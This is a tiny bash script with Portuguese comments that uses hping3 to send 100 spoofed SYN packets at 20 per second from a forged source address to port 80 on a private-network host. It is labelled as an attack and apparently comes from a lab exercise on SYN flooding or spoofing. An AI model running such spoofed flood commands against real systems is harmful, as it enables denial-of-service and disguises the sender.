#!/bin/bash

# -c: Numero de pacotes enviados.
# -S: Flag utilizada no ataque (SYN).
# -p: Porta de destino.
# -i: Taxa de envio (u20000 = 20 pacotes por segundo).
# -a: Endereço de spoof.
hping3 -c 100 -S -p 80 -i u20000 -a 172.20.1.3 172.20.1.2
